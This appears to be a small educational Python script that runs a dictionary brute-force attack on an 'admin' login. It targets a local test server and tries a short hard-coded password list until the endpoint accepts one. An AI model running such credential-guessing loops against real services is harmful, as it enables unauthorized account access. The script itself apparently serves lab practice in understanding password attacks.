import requests
import time

url = "http://127.0.0.1:5000/login"

username = "admin"

# Password dictionary
passwords = (
    "password",
    "admin",
    "megahardpassword",
    "crickethealer",
    "superduperpassword2025", # correct password found eventually
    "python",
)

# Looping through dictionary to input potential passwords
for password in passwords:
    response = requests.post(url,
                             json={"username": username, "password": password})

    if response.status_code == 200: # if password is valid, it has been successful.
        print(f"[SUCCESSFUL] PASSWORD FOUND: {password}")
        break
    else:
        print(f"[FAILURE] INCORRECT: {password}") # else, it is unsuccessful.

        time.sleep(0.5) # To slow down output. In real-life, this would not be set